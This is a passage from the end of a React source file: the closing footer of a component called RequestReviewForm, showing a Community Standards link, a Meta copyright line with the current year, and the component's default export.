        <a href="#">Community Standards</a>
        <span>Meta © {new Date().getFullYear()}</span>
      </div>
    </div>
  );
};

export default RequestReviewForm;
